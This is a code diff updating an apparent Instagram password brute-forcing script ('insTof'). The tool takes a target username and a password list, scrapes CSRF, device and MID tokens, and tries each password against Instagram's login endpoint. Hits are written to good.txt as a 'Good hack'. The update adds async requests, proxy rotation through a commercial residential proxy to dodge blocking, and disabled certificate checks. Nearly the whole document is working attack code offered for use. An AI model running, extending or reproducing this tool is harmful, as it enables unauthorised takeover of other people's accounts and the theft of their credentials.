@@ -1,9 +1,16 @@
-import os
-import sys
-import json
-from time import sleep
-from datetime import datetime
 import requests
+import re
+import asyncio
+import time
+from aiohttp import ClientSession, ClientTimeout
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+from aiohttp import ClientSession, ClientTimeout
+from aiohttp_socks import ProxyConnector
+import ssl
+
+BRIGHTDATA_PROXY = "brd.superproxy.io:33335" # Your link from bright data | https://brightdata.com
+CA_CERT_PATH = "SSL.crt"  # Set CA certificate path
 
 normal_color = "\33[00m"
 info_color = "\033[1;33m"
@@ -23,7 +30,7 @@ def Logo():
                             "F3  $r
                            $$$$.e$"  .
                            "$$$$$"   "
-     (insTof by 8.3v)        $$$$c  /
+     (insTof by 8.4v)        $$$$c  /
         .                   $$$$$$$P
        ."c                      $$$
       .$c3b                  ..J$$$$$e
@@ -38,70 +45,123 @@ def Logo():
           
 ''')
 
-def clear_console():
-    os.system('cls' if os.name == 'nt' else 'clear')
 
-def attempt_login(session, username, password, csrf_token):
-    login_url = 'https://www.instagram.com/accounts/login/ajax/'
-    time = int(datetime.now().timestamp())
-    payload = {
-        'username': username,
-        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password}',
-        'queryParams': {},
-        'optIntoOneTap': 'false'
-    }
+def GetCSRF_Token(use_proxy=False):
     headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
-        "X-Requested-With": "XMLHttpRequest",
-        "Referer": "https://www.instagram.com/accounts/login/",
-        "x-csrftoken": csrf_token
+        'Host': 'www.instagram.com',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36',
     }
-    return session.post(login_url, data=payload, headers=headers)
+    proxies = {'http': BRIGHTDATA_PROXY, 'https': BRIGHTDATA_PROXY} if use_proxy else None
 
-def read_passwords(file_path):
-    try:
-        with open(file_path, 'r') as file:
-            return file.read().splitlines()
-    except FileNotFoundError:
-        print("Password file not found.")
-        sys.exit(1)
+    response = requests.get('https://www.instagram.com/', headers=headers, proxies=proxies, verify=False)
+    csrf_token = re.search(r'csrftoken=([a-zA-Z0-9\-_]+)', response.headers.get('Set-Cookie', ''))
+    csrf_token_value = csrf_token.group(1) if csrf_token else None
 
-def get_csrf_token(session):
-    link = 'https://www.instagram.com/accounts/login/'
-    req = session.get(link)
-    return req.cookies.get('csrftoken', None)
+    html_content = response.text
+    device_id_match = re.search(r'"device_id":"([a-zA-Z0-9\-]+)"', html_content)
+    device_id = device_id_match.group(1) if device_id_match else None
 
-def main():
-    clear_console()
-    print('')
-    Logo()
-    username = input(end_banner_color + "Username => ")
-    passwords_file = input("List of Passwords => ")
-    passwords = read_passwords(passwords_file)
-    
-    with requests.Session() as session:
-        csrf_token = get_csrf_token(session)
-        if not csrf_token:
-            print("CSRFTOKEN not found in cookies")
-            return
+    return csrf_token_value, device_id
+
+
+def Get_MID(csrf_token_value, use_proxy=False):
+    cookies = {'csrftoken': csrf_token_value}
+    headers = {
+        'Host': 'www.instagram.com',
+        'X-CSRFToken': csrf_token_value,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36',
+    }
+    proxies = {'http': BRIGHTDATA_PROXY, 'https': BRIGHTDATA_PROXY} if use_proxy else None
+
+    response = requests.get('https://www.instagram.com/api/v1/web/data/shared_data/', cookies=cookies, headers=headers, proxies=proxies, verify=False)
+    mid = re.search(r'mid=([^;]+)', response.headers.get('Set-Cookie', ''))
+    return mid.group(1) if mid else None
+
+
+def generate_enc_password(password):
+    timestamp = int(time.time())
+    return f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}"
+
+
+async def attempt_login(session, username, password, csrf_token, device_id, mid):
+    cookies = {
+        'csrftoken': csrf_token,
+        'mid': mid,
+        'ig_did': device_id,
+    }
+
+    headers = {
+        'Host': 'www.instagram.com',
+        'X-CSRFToken': csrf_token,
+        'X-IG-App-ID': '936619743392459',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Accept': '*/*',
+        'Origin': 'https://www.instagram.com',
+        'Referer': 'https://www.instagram.com/accounts/login/?next=%2Flogin%2F&source=desktop_nav',
+    }
+
+    data = {
+        'enc_password': generate_enc_password(password),
+        'username': username,
+        'queryParams': '{"next":"/login/","source":"desktop_nav"}',
+        'optIntoOneTap': 'false',
+        'trustedDeviceRecords': '{}',
+    }
+
+    async with session.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',
+                            cookies=cookies, headers=headers, data=data) as response:
+        return await response.json()
+
+
+async def main():
+    username = input("Username: ")
+    passwords_file = input("Password List File: ")
+    use_proxy = input("Use Bright Data proxy? (yes/no): ").strip().lower() == "yes"
+
+    async def read_file(file_path):
+        try:
+            with open(file_path, 'r') as file:
+                return file.read().splitlines()
+        except FileNotFoundError:
+            print(f"File not found: {file_path}")
+            return []
+
+    passwords = await read_file(passwords_file)
+
+    csrf_token, device_id = GetCSRF_Token(use_proxy=use_proxy)
+    if not csrf_token or not device_id:
+        print("Failed to fetch CSRF token or Device ID.")
+        return
+
+    mid = Get_MID(csrf_token, use_proxy=use_proxy)
+    if not mid:
+        print("Failed to fetch MID.")
+        return
+
+    ssl_context = ssl.create_default_context(cafile=CA_CERT_PATH)
+    connector = ProxyConnector.from_url(BRIGHTDATA_PROXY, ssl=ssl_context) if use_proxy else None
+
+    timeout = ClientTimeout(total=60)
+    async with ClientSession(connector=connector, timeout=timeout) as session:
         for password in passwords:
-            response = attempt_login(session, username, password, csrf_token)
-            if 'checkpoint_url' in response.text:
-                print((red_color + ' --> Username : ' + green_color + username + red_color + ' --> Password : ' + green_color + password + ' --> Good hack'))
-                with open('good.txt', 'a') as x:
-                    x.write(username + ':' + password + '\n')
-                break 				
-            if 'userId' in response.text:
-                print ((red_color + ' --> Username : ' + green_color + username + red_color +' --> Password : '+ green_color + password + ' --> Good hack'))
-                with open('good.txt', 'a') as x:
-                    x.write(username + ':' + password + '\n')
-            if 'error' in response.text:
-                print((normal_color+'' + ' --> Username : ' + end_banner_color + username + red_color + ' --> Password : ' + end_banner_color + password + red_color + ' --> Sorry, there was a problem'))
-            elif 'status' in response.text:
-              print (end_banner_color + "---------------------------------------")
-              print ((red_color + ' --> Username : ' + end_banner_color + username + red_color +' --> Password : '+ end_banner_color + password + red_color +' --> Error'))
-              print('\nSleeping for 10 seconds...')
-              sleep(10)
+            try:
+                result = await attempt_login(session, username, password, csrf_token, device_id, mid)
+                if 'userId' in result:
+                    print((red_color + ' --> Username : ' + green_color + username + red_color + ' --> Password : ' + green_color + password + ' --> Good hack'))
+                    with open('good.txt', 'a') as file:
+                        file.write(f"{username}:{password}\n")
+                    return
+                if 'checkpoint_url' in result:
+                    print((red_color + ' --> Username : ' + green_color + username + red_color + ' --> Password : ' + green_color + password + ' --> Good hack'))
+                    with open('good.txt', 'a') as file:
+                        file.write(f"{username}:{password}\n")
+                    return
+                else:
+                    print ((red_color + ' --> Username : ' + end_banner_color + username + red_color +' --> Password : '+ end_banner_color + password + red_color +' --> Error'))
+            except Exception as e:
+                print(f"Error during login attempt: {e}")
+            await asyncio.sleep(1)
 
 if __name__ == "__main__":
-    main()
+    asyncio.run(main())
